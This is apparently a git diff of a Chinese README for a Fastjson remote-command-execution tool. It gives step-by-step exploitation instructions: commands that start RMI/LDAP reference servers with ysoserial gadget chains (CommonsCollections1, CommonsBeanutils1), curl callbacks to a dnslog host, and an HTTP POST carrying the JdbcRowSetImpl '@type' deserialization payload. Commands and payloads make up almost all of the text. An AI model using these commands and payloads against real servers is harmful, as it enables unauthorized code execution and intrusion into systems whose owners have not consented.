@@ -1,7 +1,10 @@
 # fastjson_rce_tool
 
 ```
+随着各种关于安全的法律出台，该项目2020年初开始不对外开放。
+
 备注：这里的利用方式可以突破一些限制条件，来完成命令执行。
+
 
 rmi:
 1. 启动RMI服务，后面写要执行的语句(有依赖，tomcat8稳定复现)
@@ -23,16 +26,10 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 ===================================================================================================
 
 ldap:
-1. 用下面命令生成base64编码过的测试语句
-java -jar ysoserial6.jar URLDNS 'http://dnslog.wyzxxz.cn'|base64 > base64_payload_file
-常用的例如：
-java -jar ysoserial6.jar CommonsBeanutils1 'curl dnslog.wyzxxz.cn'|base64 > base64_payload_file
-java -jar ysoserial6.jar CommonsCollections7 'curl dnslog.wyzxxz.cn'|base64 > base64_payload_file
+1. 启动LDAP服务，后面写要执行的语句
+java -cp fastjson_tool.jar LDAPRefServer2 8888 CommonsCollections1 "curl dnslog.cn"
 
-2. 启动LDAP服务
-java -cp fastjson_tool.jar LDAPRefServer2 8888  base64_payload_file
-
-3. 发送请求包
+2. 发送请求包
 POST /test HTTP/1.1
 Host: 127.0.0.1
 Content-Type: application/json
@@ -44,7 +41,7 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8888/Object","autoCommit":true}
 
 
-4. 查看日志是否执行成功，如果没有，用ysoserial的其他Payload尝试生成。
+3. 查看日志是否执行成功，如果没有，用ysoserial的其他Payload尝试生成。
 
 ===================================================================================================
 else:
